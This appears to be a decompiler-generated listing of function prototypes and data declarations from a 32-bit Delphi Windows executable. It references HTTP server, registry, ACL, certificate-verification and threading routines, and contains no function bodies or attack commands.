BOOL __fastcall sub_442610(int a1, __int32 a2);
int __fastcall sub_442850(int a1, int a2);
_DWORD *__fastcall sub_4428D0(int a1, int a2, int *a3);
int __fastcall sub_442970(int result, int a2);
HKEY __fastcall sub_442980(int a1, HKEY a2);
// _DWORD *__usercall sub_4429B0@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>);
// _DWORD *__usercall sub_442A80@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>);
_DWORD *__fastcall sub_442B90(int a1, int a2, char a3, int *a4);
void sub_442D50();
LONG sub_442D60();
long double __stdcall sub_442DB0(double a1);
long double __fastcall sub_442DE0(int a1, _SYSTEMTIME *a2, double a3);
__int64 __stdcall sub_442E90(double a1);
__int64 __fastcall sub_442EE0(int a1, _SYSTEMTIME *a2, double a3);
// long double __usercall sub_442F10@<st0>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, long double a3@<st0>);
__int64 sub_442F90();
// int __usercall sub_443020@<eax>(long double a1@<st0>);
// int __usercall sub_4430C0@<eax>(long double a1@<st0>);
__int16 __fastcall sub_4430F0(unsigned __int16 a1, unsigned __int16 a2);
__int16 __stdcall sub_443140(double a1);
__int64 __stdcall sub_4431A0(double a1);
__int64 __stdcall sub_443240(double a1, double a2);
void sub_443290();
BOOL __stdcall EnumFunc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam); // idb
HMODULE __fastcall sub_449740(int a1, int *a2);
// _DWORD __fastcall Idosfilename::FileNameVMSToUnix(Idosfilename *__hidden this, const int System::AnsiString); idb
bool __fastcall sub_449880(__int32 a1, volatile __int32 *a2, __int32 a3, volatile __int32 *a4, volatile __int32 *a5);
int __fastcall sub_449AD0(int a1, char a2, int a3, __int16 a4);
int sub_449B40();
char __fastcall sub_449B80(int a1, int a2, volatile __int32 *a3);
char __fastcall sub_449CA0(int a1);
char __fastcall sub_44A0C0(int a1, void *a2, int a3);
char __fastcall sub_44A130(int a1);
char __fastcall sub_44A190(int a1, _DWORD *a2);
char __fastcall sub_44A230(int a1, void *a2);
int __fastcall sub_44A260(int a1, const void *a2, int a3);
int __fastcall sub_44A2D0(int a1, int a2, const void *a3, int a4);
int __fastcall sub_44A320(int a1, int a2, __int16 a3);
int __fastcall sub_44A350(int a1);
int __fastcall sub_44A3D0(int a1, int a2);
int __fastcall sub_44A420(int a1, __int16 a2);
volatile __int32 *__fastcall sub_44A450(int a1, volatile __int32 *a2);
char __fastcall sub_44A4A0(int a1, int a2, int a3);
_DWORD *__fastcall sub_44A780(int a1, int a2);
volatile __int32 *__fastcall sub_44A970(int a1, volatile __int32 *a2);
char __fastcall sub_44A9C0(int a1, int a2, int a3);
int __fastcall sub_44ABD0(int a1, int a2);
int sub_44AD40();
char __fastcall sub_44AE00(int a1, _WORD *a2, _WORD *a3, _WORD *a4, _WORD *a5);
int __fastcall sub_44AFA0(int a1, int a2, int *a3);
_DWORD *__fastcall sub_44B090(_DWORD *a1);
int *__fastcall sub_44B260(int a1, int *a2, int a3);
_DWORD *__fastcall sub_44B330(int a1, int a2);
_DWORD *__fastcall sub_44B460(LCID a1, int a2);
char __fastcall sub_44B4B0(char a1, char a2);
int __fastcall sub_44B890(int a1, int a2, int *a3);
int *__fastcall sub_44B9B0(void *a1, int *a2);
HANDLE __fastcall sub_44BAD0(int a1, int a2, BOOL a3, DWORD dwProcessId);
// char __usercall sub_44BB40@<al>(DWORD a1@<eax>, int a2@<edi>, int a3@<esi>, long double a4@<st0>);
_DWORD *__fastcall sub_44C140(char a1, char a2, _DWORD *a3);
char __fastcall sub_44C3D0(_DWORD *a1);
// int __usercall sub_44C5B0@<eax>(HKEY a1@<eax>, void *a2@<edx>, __int32 a3@<ecx>, int a4@<edi>);
int __fastcall sub_44CCB0(_DWORD *a1);
// char __usercall sub_44CFE0@<al>(void *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4@<edi>, int a5@<esi>, long double a6@<st0>);
_DWORD *__fastcall sub_44D0D0(int a1, void *a2, char a3, _DWORD *a4, volatile __int32 *a5);
int __fastcall sub_44D160(char a1, int a2);
unsigned __int8 __fastcall sub_44D8D0(volatile __int32 *a1);
_DWORD *__fastcall sub_44D910(int a1, int a2);
_DWORD *__fastcall sub_44D9A0(int a1, int a2);
_DWORD *__fastcall sub_44DA30(int a1, int a2, volatile __int32 *a3);
int __fastcall sub_44DBB0(__int32 a1, char a2, char a3, volatile __int32 *a4, volatile __int32 *a5, int *a6);
// volatile __int32 *__usercall sub_44DE50@<eax>(int a1@<eax>, int a2);
// char __usercall sub_44DEA0@<al>(char a1@<al>, volatile __int32 *a2@<edx>, _DWORD **a3@<edi>);
bool __fastcall sub_44E1D0(int a1, HWND a2, int a3, int a4, int a5);
bool __fastcall sub_44E280(HWND a1, int a2, int a3, int a4);
bool sub_44E310();
char sub_44E3B0();
void sub_44E450();
int __fastcall sub_44E9F0(volatile __int32 *a1, _DWORD *a2, int a3, _DWORD *a4);
// int __usercall sub_44EA50@<eax>(int a1@<edi>, int a2@<esi>, long double a3@<st0>);
// char __usercall sub_44EAF0@<al>(int a1@<edi>, int a2@<esi>, long double a3@<st0>, int a4);
// char __usercall sub_44EB90@<al>(unsigned int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
// int __fastcall Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(_DWORD, _DWORD, _DWORD); weak
int sub_44ED60();
_DWORD *__fastcall sub_44EDC0(int a1, _DWORD *a2);
int (**sub_44EE00())();
_DWORD *__fastcall sub_44EE20(int a1, _DWORD *a2, volatile __int32 *a3, _DWORD *a4);
HGLOBAL sub_44EE70();
int *__fastcall sub_44EEA0(int a1, char a2, void *a3);
// int *__userpurge sub_44EF60@<eax>(int a1@<eax>, char a2@<dl>, WELL_KNOWN_SID_TYPE a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>, PSID DomainSid);
int sub_44F090();
HGLOBAL *__fastcall sub_44F0E0(int a1, HGLOBAL *a2);
DWORD __fastcall sub_44F110(int a1);
bool __fastcall sub_44F140(int a1);
int __fastcall sub_44F180(int a1, unsigned __int8 a2, int a3);
int __fastcall sub_44F1F0(int a1, char a2);
int sub_44F240();
HGLOBAL *__fastcall sub_44F280(int a1, HGLOBAL *a2);
int (**__fastcall sub_44F2B0(int a1, unsigned __int8 a2))();
int __fastcall sub_44F3A0(int a1);
int __fastcall sub_44F3C0(int a1, unsigned int a2);
// PACL __usercall sub_44F3F0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>, long double a4@<st0>);
// _DWORD __stdcall unknown_libname_163(_DWORD, char); weak
int sub_44F670();
int sub_44F6B0();
int *__fastcall sub_44F6D0(int a1, int a2);
// bool __usercall sub_44F700@<al>(int a1@<eax>, ACL *a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int sub_44FA40();
int __fastcall sub_44FA60(_DWORD *a1, _DWORD *a2);
// bool __usercall sub_44FAC0@<al>(int a1@<eax>, ACL *a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// char __usercall sub_44FED0@<al>(void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
// char __usercall sub_44FF50@<al>(void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
char __fastcall sub_44FFD0(void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *), SECURITY_INFORMATION a2, void *a3, PSID psidGroup, PACL pDacl, PACL pSacl);
// char __usercall sub_450150@<al>(void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
// int __fastcall Qcomctrls::TTab::TTab(_DWORD, _DWORD); weak
int sub_4502C0();
// int __stdcall sub_450310(char, PDWORD ReturnLength, DWORD TokenInformationLength); idb
// int __usercall sub_4503E0@<eax>(int a1@<eax>, char a2@<dl>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
// char __userpurge sub_450510@<al>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>, char a7);
// char __userpurge sub_4505D0@<al>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>, char a7, char a8);
// char __usercall sub_4506A0@<al>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4@<edi>, int a5@<esi>, long double a6@<st0>);
int __fastcall sub_450860(int a1, _DWORD *a2, volatile __int32 *a3);
char __fastcall sub_450C40(int a1);
int __fastcall sub_450C80(int a1);
int __fastcall sub_450CA0(int a1, char a2, int a3);
char __fastcall sub_450D20(int a1);
int __cdecl sub_450E10(int a1);
int __fastcall sub_450E60(int a1);
_DWORD *__fastcall sub_451000(int a1, _DWORD *a2);
_DWORD *__fastcall sub_451040(int a1, const signed __int32 *a2, _DWORD *a3);
// BOOL __stdcall CryptQueryObject(DWORD dwObjectType, const void *pvObject, DWORD dwExpectedContentTypeFlags, DWORD dwExpectedFormatTypeFlags, DWORD dwFlags, DWORD *pdwMsgAndCertEncodingType, DWORD *pdwContentType, DWORD *pdwFormatType, HCERTSTORE *phCertStore, HCRYPTMSG *phMsg, const void **ppvContext);
// BOOL __stdcall CryptMsgGetParam(HCRYPTMSG hCryptMsg, DWORD dwParamType, DWORD dwIndex, void *pvData, DWORD *pcbData);
// PCCERT_CONTEXT __stdcall CertFindCertificateInStore(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, const void *pvFindPara, PCCERT_CONTEXT pPrevCertContext);
// DWORD __stdcall CertGetNameStringW(PCCERT_CONTEXT pCertContext, DWORD dwType, DWORD dwFlags, void *pvTypePara, LPWSTR pszNameString, DWORD cchNameString);
// BOOL __stdcall CertFreeCertificateContext(PCCERT_CONTEXT pCertContext);
// BOOL __stdcall CertCloseStore(HCERTSTORE hCertStore, DWORD dwFlags);
// BOOL __stdcall CryptMsgClose(HCRYPTMSG hCryptMsg);
// LONG __stdcall WinVerifyTrust(HWND hwnd, GUID *pgActionID, LPVOID pWVTData);
LONG __fastcall sub_451240(int a1);
int __fastcall sub_4512D0(int a1, _DWORD *a2);
_DWORD *__fastcall sub_451510(unsigned __int8 a1, int *a2);
_DWORD *__fastcall sub_451590(unsigned __int8 a1, unsigned __int8 a2, volatile __int32 *a3);
volatile __int32 *__fastcall sub_4516A0(unsigned __int8 a1, volatile __int32 *a2);
int __fastcall sub_4516E0(int a1, int a2, int a3, volatile __int32 *a4);
// int __userpurge sub_451730@<eax>(unsigned __int8 a1@<al>, unsigned __int8 a2@<dl>, int a3@<ebx>, int a4@<edi>, int a5@<esi>, volatile __int32 *a6, int a7);
char __fastcall sub_4518F0(char result);
int __fastcall sub_451900(int cchLength, _BYTE *a2);
int sub_451A10();
void sub_451A60();
int __fastcall sub_451A90(signed int *a1, int *a2);
_DWORD *__fastcall sub_451B20(_DWORD *result);
int __fastcall sub_451B40(int result, int a2);
int sub_451BC8();
int *sub_451C3C();
void sub_451C54();
int __fastcall sub_4521B0(int *a1, signed int a2, __int32 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8, BOOL *a9);
// _DWORD *__usercall sub_452730@<eax>(int *a1@<eax>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_452920@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
_DWORD *__fastcall sub_452AF0(int a1, BOOL *a2, _DWORD *a3);
_DWORD *__fastcall sub_452B60(int a1, __int32 a2, int a3);
int sub_452CA8(); // weak
// int __usercall sub_452CB0@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
int sub_452D50();
__int64 sub_452DA0();
__int64 sub_452DD0();
int __fastcall sub_452E00(_QWORD *a1);
// int __usercall sub_452E90@<eax>(int *a1@<eax>, char a2@<dl>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// int __userpurge sub_453530@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4@<edi>, int a5@<esi>, int a6);
// int __usercall sub_453660@<eax>(int *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
int __fastcall sub_453800(int a1, signed int *a2, int *a3);
int sub_453820();
// int __fastcall Idglobal::AppendBytes(_DWORD, _DWORD); weak
// _DWORD __stdcall sub_4538E0(char, _DWORD); weak
char __fastcall sub_453A10(int a1);
// _DWORD __stdcall Idexception::EIdException::EIdException(_DWORD); weak
void __stdcall sub_454460(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped); // idb
void __stdcall CompletionRoutine(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped); // idb
volatile __int32 *__fastcall sub_4544C0(_DWORD *a1, volatile __int32 *a2);
int __fastcall sub_454500(Ibservices::TLicenseMaskInfo *this); // idb
int __fastcall sub_454540(int result, char a2, __int16 a3);
void __fastcall sub_454550(int a1);
int __fastcall sub_454570(int a1, char a2, int a3, int a4);
_DWORD *sub_454660();
// _DWORD __fastcall Imglist::TCustomImageList::Initialize(Imglist::TCustomImageList *__hidden this); idb
// int __cdecl sub_454730(_DWORD, _DWORD); weak
BOOL __fastcall sub_454790(int a1, unsigned int a2);
unsigned __int8 __fastcall sub_454980(int a1, unsigned __int8 a2, int a3, int a4);
bool __fastcall sub_454A80(int a1);
int __fastcall sub_454B80(int a1);
int __fastcall sub_454BA0(int result, int a2);
int __fastcall sub_454BB0(int a1);
int __fastcall sub_454BD0(_WORD *a1);
int __fastcall sub_454BF0(int result, int a2);
char __fastcall sub_454C00(int a1, int a2);
int __fastcall sub_454C40(int a1, char a2, char a3, _DWORD *a4, int a5, int a6, int a7, int a8);
int sub_454CB0();
_DWORD *__fastcall sub_454D00(int a1, int a2, int a3);
// void __usercall __spoils<edx,ecx> sub_454D30(char a1@<dl>, _DWORD *a2@<ecx>, int a3@<edi>);
_DWORD *__fastcall sub_454E00(int a1, int a2, int a3);
int __fastcall sub_454E20(int a1, char a2, void *a3, int a4);
unsigned int __fastcall sub_454EB0(unsigned int *a1, unsigned int a2);
_DWORD *__fastcall sub_454EE0(_DWORD *a1);
_DWORD *__fastcall sub_454F10(_DWORD *result);
int __fastcall sub_455170(int a1, char a2, int a3, int a4);
Imglist::TCustomImageList *__fastcall sub_455240(Imglist::TCustomImageList *a1);
int __fastcall sub_4552D0(int a1, void (__fastcall **a2)(_DWORD));
int __fastcall sub_455300(int result);
Classes::TThread *__fastcall sub_455480(int a1, char a2, int a3);
// int __usercall sub_4554F0@<eax>(int a1@<edi>);
_DWORD *__fastcall sub_455530(int *a1);
int __fastcall sub_455690(int a1, int a2);
int __fastcall sub_4556B0(int a1, char a2, int a3, _DWORD *a4, int a5, int a6, int a7);
int sub_455800();
BOOL __fastcall sub_4558F0(int a1);
int __fastcall sub_455910(int a1);
char __fastcall sub_4559C0(int a1);
int __fastcall sub_455A20(int a1, void (__fastcall **a2)(_DWORD));
char __fastcall sub_455AA0(int a1, _DWORD *a2);
int __fastcall sub_455B80(int a1, int a2);
// _DWORD __stdcall Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(_DWORD); weak
// int __usercall sub_455EA0@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>);
// int sub_455F10(void); weak
_BYTE *__fastcall sub_455F70(int a1);
int __fastcall sub_455FB0(int a1);
// char __userpurge sub_455FD0@<al>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5, int a6);
int sub_456A00();
int __fastcall sub_456A70(int a1);
int __fastcall sub_456AB0(int a1);
int __fastcall sub_456AE0(int a1);
char __fastcall sub_456B00(int a1, int *a2);
int __fastcall sub_456B60(int a1, unsigned __int16 *a2);
int sub_456B90();
// char __usercall sub_456C00@<al>(void *a1@<eax>, int a2@<edi>);
// int __usercall sub_457270@<eax>(DWORD a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// bool __usercall sub_457320@<al>(int a1@<eax>, void (__fastcall *a2)(__int64 *, char *)@<edx>, DWORD a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>);
Classes::TThread *__fastcall sub_457840(Classes::TThread *a1, char a2, int a3, _DWORD *a4);
_DWORD *__fastcall sub_4578C0(int *a1);
int __stdcall sub_457950(int a1, int a2);
// int __usercall sub_457990@<eax>(int a1@<eax>, char a2@<dl>, DWORD a3@<ecx>, int a4@<edi>, int a5@<esi>);
// char __usercall sub_457AC0@<al>(int a1@<eax>, int a2@<edi>);
// char __usercall sub_457AF0@<al>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// char __usercall sub_457B30@<al>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>);
char __fastcall sub_457BD0(int a1, __int64 a2);
char __fastcall sub_457C70(int a1, __int64 a2);
int __fastcall sub_457CC0(int a1);
char __fastcall sub_457D00(int a1, int a2);
// char __usercall sub_457D60@<al>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// _DWORD __stdcall unknown_libname_173(_DWORD, _DWORD); weak
_DWORD *sub_4581A0();
// _DWORD *__usercall sub_458220@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int sub_4582B0();
// _DWORD *__usercall sub_4582D0@<eax>(int a1@<eax>, int a2@<edx>, int a3);
bool __fastcall sub_458340(int a1, int a2, int a3, int a4, int a5);
_DWORD *__cdecl sub_458900(int a1);
DWORD __fastcall sub_458A10(__int32 a1, __int32 a2, int a3, int a4, _DWORD *a5, _DWORD *a6);
_DWORD *__fastcall sub_458D30(int a1, int a2);
// int __usercall sub_458E30@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
int __fastcall sub_458F40(volatile __int32 *a1);
char __fastcall sub_459040(DWORD *a1);
// int __usercall sub_459130@<eax>(DWORD a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// __int64 __usercall sub_4591C0@<edx:eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_4594B0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_459500@<eax>(volatile __int32 *a1@<eax>, int a2);
// int __usercall sub_459600@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
_DWORD *__fastcall sub_459810(int a1, char a2, char a3);
// int __fastcall unknown_libname_174(_DWORD, _DWORD); weak
int sub_4598E0();
_DWORD *__fastcall sub_459920(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
// int __usercall sub_459980@<eax>(int a1@<eax>, int *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
_DWORD *__fastcall sub_459B70(int a1, int a2, _DWORD *a3);
__int64 sub_459B90();
// int __usercall sub_459BC0@<eax>(int *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// char __usercall sub_459CE0@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// char __usercall sub_459D20@<al>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
// _DWORD *__usercall sub_459E10@<eax>(int *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
int sub_459EB0();
_DWORD *__fastcall sub_45A110(int *a1);
// int __usercall sub_45A200@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
_DWORD *__fastcall sub_45A260(char a1, int *a2);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// _DWORD *__usercall sub_45A420@<eax>(Classes::TStream *a1@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
int __fastcall sub_45A560(int a1, int a2);
// int __usercall sub_45A630@<eax>(void *a1@<eax>, char a2@<dl>, int a3@<edi>, int a4@<esi>, long double a5@<st0>);
// int __usercall sub_45A790@<eax>(int *a1@<eax>, void *a2@<edx>, __int32 a3@<ecx>, BOOL a4@<ebx>, int a5@<edi>, int a6@<esi>, long double a7@<st0>);
// int __usercall sub_45A980@<eax>(_DWORD **a1@<edi>);
volatile __int32 *__fastcall sub_45AA00(volatile __int32 *a1);
char __fastcall sub_45AA40(int a1, _DWORD *a2, _DWORD *a3);
int sub_45AAB4(); // weak
// int __usercall sub_45AAC0@<eax>(int a1@<edi>);
bool __fastcall sub_45AC10(const WCHAR *a1);
// int __usercall sub_45AC90@<eax>(_DWORD **a1@<edi>, int a2@<esi>);
// int __usercall sub_45AFD0@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<edi>);
volatile __int32 *__fastcall sub_45B140(volatile __int32 *a1);
bool sub_45B1A0();
signed int sub_45B200();
signed int sub_45B360();
// unsigned __int8 __usercall sub_45B4C0@<al>(_DWORD **a1@<edi>, int a2@<esi>, long double a3@<st0>);
// char __usercall sub_45BA80@<al>(int a1@<edi>);
// int __usercall sub_45BB20@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
char sub_45BD10();
// _DWORD *__usercall sub_45BD30@<eax>(__int32 a1@<ecx>, int a2@<edi>);
// int __usercall sub_45BFA0@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<esi>);
char __cdecl sub_45C060(int a1);
char __fastcall sub_45C1A0(char a1);
// char __usercall sub_45C3F0@<al>(_DWORD **a1@<edi>);
// volatile __int32 *__usercall sub_45C410@<eax>(int a1@<eax>, int a2);
char sub_45C460();
// int __usercall sub_45C840@<eax>(_DWORD **a1@<edi>);
char sub_45C9C0();
// int __usercall sub_45CA60@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<esi>);
// char __usercall sub_45CB20@<al>(int a1@<ebx>, int a2@<esi>);
bool __fastcall sub_45CF10(int a1);
// char __usercall sub_45CFC0@<al>(unsigned int a1@<eax>, BOOL a2@<ebx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>, int a6);
// char __usercall sub_45D0C0@<al>(BOOL a1@<ebx>, int a2@<edi>, int a3@<esi>, long double a4@<st0>);
_DWORD *sub_45D210();
// int __usercall sub_45D370@<eax>(DWORD a1@<ebx>, _DWORD **a2@<edi>, int a3@<esi>, long double a4@<st0>);
// int __usercall sub_45E8B0@<eax>(DWORD a1@<ebx>, _DWORD **a2@<edi>, int a3@<esi>, long double a4@<st0>);
_DWORD *__fastcall sub_45EA60(int a1, char a2, void *a3, int a4, int a5, BOOL *a6);
int sub_45EB08(); // weak
// _DWORD *__usercall sub_45EB10@<eax>(int *a1@<eax>, char a2@<dl>, __int32 a3@<ecx>, int a4@<edi>, int a5@<esi>, long double a6@<st0>);
int sub_45EDB0();
int sub_464000();
void sub_4640E0();
HMODULE sub_4640F0();
// void __usercall sub_464198(int a1@<ebx>);
// int __usercall sub_4644BC@<eax>(int a1@<edi>);
int sub_464580();
void sub_464660();
_DWORD *sub_464680();
int sub_464740();
int sub_4647B0();
void sub_464850();
char *sub_464890();
int sub_4648E0();
HRESULT sub_464940();
int sub_464970();
int *sub_464988();

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
char byte_40124C = '\x12'; // weak
__int16 cls_System_TObject = 0; // weak
int dword_402B7C[7] = { 1096028945, 2036429426, 1937331004, 778921332, 1918986307, 574, 0 }; // weak
_UNKNOWN loc_405717; // weak
_UNKNOWN loc_40571E; // weak
_UNKNOWN loc_405A62; // weak
_UNKNOWN loc_405A69; // weak
_UNKNOWN loc_406622; // weak
_UNKNOWN loc_40668E; // weak
_UNKNOWN loc_406738; // weak
_UNKNOWN loc_40673F; // weak
int dword_406970 = 2573; // weak
int dword_4076F8 = 0; // weak
_UNKNOWN loc_4089C8; // weak
_UNKNOWN loc_408FE8; // weak
_UNKNOWN loc_408FEF; // weak
_UNKNOWN loc_4094F4; // weak
_UNKNOWN loc_4094FB; // weak
int dword_40950C = 44; // weak
_UNKNOWN loc_40992C; // weak
_UNKNOWN loc_409933; // weak
_UNKNOWN loc_409949; // weak
_UNKNOWN loc_409950; // weak
const WCHAR ValueName = 0u; // idb
_UNKNOWN loc_409A97; // weak
_UNKNOWN loc_409A9E; // weak
_UNKNOWN loc_409B5E; // weak
_UNKNOWN loc_409B65; // weak
_UNKNOWN loc_409C27; // weak
_UNKNOWN loc_409C2E; // weak
_UNKNOWN loc_409CF8; // weak
_UNKNOWN loc_409CFF; // weak
_UNKNOWN loc_409E1B; // weak
_UNKNOWN loc_409E22; // weak
_UNKNOWN loc_409EE2; // weak
_UNKNOWN loc_409EE9; // weak
char byte_40A118 = '\x0E'; // weak
char byte_40A424 = '\x0E'; // weak
int dword_40A684[6] = { 1096030225, 2036429426, 1937331004, 778921332, 1936607568, 1702119796 }; // weak
_UNKNOWN loc_40A8BD; // weak
_UNKNOWN loc_40A8C4; // weak
_UNKNOWN loc_40A959; // weak
_UNKNOWN loc_40A960; // weak
_UNKNOWN loc_40ACF6; // weak
_UNKNOWN loc_40ACFD; // weak
_UNKNOWN loc_40AD86; // weak
_UNKNOWN loc_40AD8D; // weak
_UNKNOWN loc_40AE5D; // weak
_UNKNOWN loc_40AE64; // weak
_UNKNOWN loc_40AF0C; // weak
_UNKNOWN loc_40AF13; // weak
_UNKNOWN loc_40B035; // weak
_UNKNOWN loc_40B03C; // weak
_UNKNOWN loc_40B306; // weak
_UNKNOWN loc_40B30D; // weak
_UNKNOWN loc_40B6C0; // weak
_UNKNOWN loc_40BC71; // weak
_UNKNOWN loc_40C611; // weak
_UNKNOWN loc_40C618; // weak
_UNKNOWN loc_40C62E; // weak
_UNKNOWN loc_40C635; // weak
__int16 word_40CDA2 = 28; // weak
int dword_411C70 = 26; // weak
_UNKNOWN loc_411EDD; // weak
int (*off_411F40[2])() = { &sub_41A948, &sub_41A914 }; // weak
void *off_4127A8 = &loc_41AA04; // weak
int (*off_412914[2])() = { &sub_41A948, &sub_41A914 }; // weak
void *off_413074 = &loc_41AA04; // weak
int (*off_4131CC[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_4133D0[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_413680[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_4137E0[2])() = { &sub_41A948, &sub_41A914 }; // weak
int dword_413C84[8] =
{
  1179916302,
  1634562671,
  1952797556,
  1735289204,
  1163144819,
  1850302834,
  1601382,
  65536
}; // weak
int dword_413DBC[6] = { 1413092113, 1836216134, 1699968097, 1852404852, 976122727, 6197 }; // weak
char byte_413DFC = '\x0E'; // weak
char byte_414174 = '\x11'; // weak
char byte_4141A4 = '\x11'; // weak
int dword_414538 = 0; // weak
int dword_4147C4[6] = { 1096029457, 2036429426, 1937331004, 778921332, 1769108595, 71198574 }; // weak
_UNKNOWN loc_4152E1; // weak
_UNKNOWN loc_4152E8; // weak
_UNKNOWN loc_415404; // weak
_UNKNOWN loc_41540B; // weak
_UNKNOWN loc_4168F5; // weak
_UNKNOWN loc_4168FC; // weak
int (*off_416A7E)() = &sub_416AB6; // weak
_UNKNOWN loc_416B68; // weak
char byte_417B38 = '\x11'; // weak
_UNKNOWN loc_417EBE; // weak
_UNKNOWN loc_417EC5; // weak
_UNKNOWN loc_417FC3; // weak
_UNKNOWN loc_417FCA; // weak
_UNKNOWN loc_418887; // weak
_UNKNOWN loc_41888E; // weak
char (*off_4188B8[2])[3] = { &byte_410041, &byte_410041 }; // weak
char (*off_4188C4)[3] = &byte_410041; // weak
int dword_4188CC = 32; // weak
_UNKNOWN loc_418A61; // weak
_UNKNOWN loc_418A68; // weak
int dword_418A70 = 67; // weak
_UNKNOWN loc_418BCB; // weak
_UNKNOWN loc_418BD2; // weak
_UNKNOWN loc_419059; // weak
_UNKNOWN loc_419060; // weak
int dword_41907C[4] = { 101, 132272, -1, 4 }; // weak
_UNKNOWN loc_41956E; // weak
_UNKNOWN loc_419575; // weak
_UNKNOWN loc_4198D9; // weak
int dword_4198F4[4] = { 48, 132272, -1, 6 }; // weak
int dword_419970[4] = { 104, 132272, -1, 2 }; // weak
int (*off_419994)[8] = &dword_410020; // weak
_UNKNOWN loc_419A93; // weak
_UNKNOWN loc_419A9A; // weak
_UNKNOWN loc_419B39; // weak
_UNKNOWN loc_419B40; // weak
int dword_419B4C[8] =
{
  1413093905,
  1702129225,
  1818324594,
  1231123013,
  1383032430,
  1919902565,
  825896548,
  24
}; // weak
char byte_419B94 = '\x0E'; // weak
_UNKNOWN loc_419C7E; // weak
_UNKNOWN loc_419D16; // weak
_UNKNOWN loc_419D1D; // weak
_UNKNOWN loc_419FB0; // weak
_UNKNOWN loc_419FB7; // weak
_UNKNOWN loc_419FCD; // weak
_UNKNOWN loc_419FD4; // weak
int dword_419FE8[4] = { 49, 132272, -1, 4 }; // weak
_UNKNOWN loc_41A2BE; // weak
_UNKNOWN loc_41A2C5; // weak
int dword_41A2DC[4] = { 49, 132272, -1, 2 }; // weak
int dword_41A36C = 101; // weak
